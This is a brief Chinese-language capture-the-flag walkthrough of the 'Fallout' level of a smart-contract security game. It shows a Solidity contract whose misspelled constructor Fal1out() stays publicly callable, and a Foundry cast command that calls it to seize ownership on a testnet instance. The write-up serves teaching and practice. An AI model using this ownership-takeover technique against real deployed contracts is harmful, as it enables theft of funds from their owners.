### 第2关：Fallout

TIPS: 在 0.4.22 版本之前, 构造函数被定义为合约的同名函数（该语法在0.5.0之后弃用了）。

如以下代码所示，合约作者准备把Fal1out() 作为 合约 Fallout 的构造函数，以在合约部署时调用。但很不巧，笔误写错了。所以我们直接调用它即可。
```solidity
contract Fallout {
    ...
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
    ...
}
```
先点击 Get new instance, F12 查看本关的合约地址 0xAAAAAAAAAAAAAAAAAAAA ，然后使用 Foundry Cast 调用 Fal1out(),即可成为该合约的 owner：

 ```shell
cast send 0xAAAAAAAAAAAAAAAAAAAA "Fal1out()" --rpc-url=https://sepolia-rollup.arbitrum.io/rpc --private-key=XXXXXXX
```

 点击 Submit Instance, 过关。
